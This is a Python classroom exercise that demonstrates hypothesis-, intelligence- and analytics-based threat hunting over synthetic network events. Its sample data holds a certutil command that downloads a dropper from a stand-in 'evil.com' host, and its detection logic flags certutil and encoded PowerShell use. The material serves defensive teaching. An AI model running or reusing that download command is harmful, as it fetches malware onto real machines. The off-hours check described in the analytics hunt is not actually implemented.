"""
Practical 34: Cybersecurity Threat Hunting Styles
Subject: Threat Intelligence and Network Security

Aim:
    To demonstrate the three primary threat hunting styles: Hypothesis-Based,
    Intelligence-Based, and Analytics-Based hunting on network event datasets.
"""

def hunt_hypothesis(events):
    # Hypothesis: Attacker is utilizing certutil or powershell LOLBins for payload retrieval
    findings = []
    for ev in events:
        cmd = ev.get("command", "").lower()
        if "certutil" in cmd or "powershell -enc" in cmd:
            findings.append(f"Host {ev['host']}: Process {cmd}")
    return findings

def hunt_intelligence(events, known_iocs):
    # Search for known malicious IPs and domain indicators
    findings = []
    for ev in events:
        dest = ev.get("dest_ip")
        if dest in known_iocs:
            findings.append(f"Host {ev['host']} connected to Malicious C2 {dest} ({known_iocs[dest]})")
    return findings

def hunt_analytics(events, byte_threshold=500000000): # 500 MB
    # Detect statistical anomaly: abnormally high outbound data transfer at off hours
    findings = []
    for ev in events:
        bytes_out = ev.get("bytes_transferred", 0)
        time = ev.get("timestamp", "")
        if bytes_out > byte_threshold:
            findings.append(f"Host {ev['host']}: {bytes_out / (1024**2):.1f} MB uploaded at {time} (Off-hours surge)")
    return findings


def main():
    print("=" * 72)
    print("  Practical 34: Threat Hunting Methodologies & Execution")
    print("=" * 72)

    events = [
        {"host": "W10-04", "timestamp": "03:15:00", "command": "certutil.exe -urlcache -split -f http://evil.com/dropper.exe", "bytes_transferred": 120000},
        {"host": "SRV-DB", "timestamp": "02:30:00", "dest_ip": "185.220.101.5", "bytes_transferred": 4500},
        {"host": "W10-12", "timestamp": "01:45:00", "dest_ip": "93.184.216.34", "bytes_transferred": 780000000}, # 780 MB
        {"host": "W10-02", "timestamp": "10:15:00", "command": "calc.exe", "bytes_transferred": 250}
    ]

    known_iocs = {
        "185.220.101.5": "Cobalt Strike C2 Beacon"
    }

    # Style 1: Hypothesis-Based
    print("\n[METHOD 1: HYPOTHESIS-BASED HUNTING]")
    print("Hypothesis: Adversaries are exploiting LOLBins to download stealth payloads.")
    h_findings = hunt_hypothesis(events)
    for f in h_findings:
        print(f"  [!] Matched: {f}")

    # Style 2: Intelligence-Based
    print("\n[METHOD 2: INTEL-DRIVEN HUNTING]")
    print("Query: Correlating endpoint network outbound connections with CTI IOC feed.")
    i_findings = hunt_intelligence(events, known_iocs)
    for f in i_findings:
        print(f"  [!] Matched: {f}")

    # Style 3: Analytics-Based
    print("\n[METHOD 3: ANALYTICS & STATISTICAL ANOMALY HUNTING]")
    print("Threshold: Outbound data exfiltration spike (> 500 MB) outside business hours.")
    a_findings = hunt_analytics(events)
    for f in a_findings:
        print(f"  [!] Matched: {f}")

    print("\n" + "=" * 72)
    print("Threat hunting cycle complete: 3 critical suspicious indicators identified.")


if __name__ == "__main__":
    main()
